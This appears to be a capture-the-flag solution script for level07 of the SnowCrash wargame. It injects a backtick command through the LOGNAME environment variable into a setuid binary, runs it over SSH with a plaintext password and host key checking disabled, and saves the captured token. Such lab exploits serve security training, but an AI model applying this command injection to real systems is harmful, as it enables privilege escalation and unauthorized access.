#!/usr/bin/env bash

SCRIPT=$(cat <<EOF
LOGNAME='\`/bin/getflag\`'; ./level07 | awk '{print $NF}'
EOF
)

# We find an executable called level07 in the home directory of level07 that seems to be a C program
# When we run strings on it we can see that it uses the LOGNAME environment variable
# It prints the value of the LOGNAME variable with echo, so we can use this to execute commands on snowcrash
# by setting the LOGNAME variable to the command we want to execute

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level07@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag07.pwd
else
	echo "Usage: ./flag07.sh <ip address> <port> <password>"
fi
